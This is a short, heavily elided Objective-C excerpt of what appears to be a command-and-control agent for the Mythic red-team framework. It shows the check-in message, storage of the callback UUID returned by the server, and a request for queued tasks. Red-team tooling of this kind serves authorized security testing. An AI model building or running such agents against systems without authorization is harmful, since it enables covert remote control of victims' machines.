...
//         @"action": @"checkin",                  // Action is always "checkin"
//         @"uuid": payloadUUID,                   // The UUID of our paylod from Mythic
...
//     /// Setup the check-in request via `POST`
...
//     /// Perform the check-in request asynchronously
...
/// Track the callback UUID (used for sending agent messages)
// static NSString *callbackUUID = nil;
        ...
        if (httpResponse.statusCode == 200 && data) {
            ...
            if ([responseString length] > 36) {
                ...
                if (jsonRange.location != NSNotFound) {
                    ...
                    if (jsonResponse[@"id"]) {
                        /// Set the callback UUID statically so it can be reused
                        callbackUUID = jsonResponse[@"id"];
                        NSLog(@"[DEBUG] Our Callback UUID\t===>\t(%@)", callbackUUID);
                    } else {
                        NSLog(@"[ERROR] ❌ No 'id' key found in the JSON.");
...
+ (void)getTasking {
    ...
    NSDictionary *taskingData = @{
        @"action": @"get_tasking",
        @"tasking_size": @1,
        @"uuid": callbackUUID  // Make sure callbackUUID is available here
    };
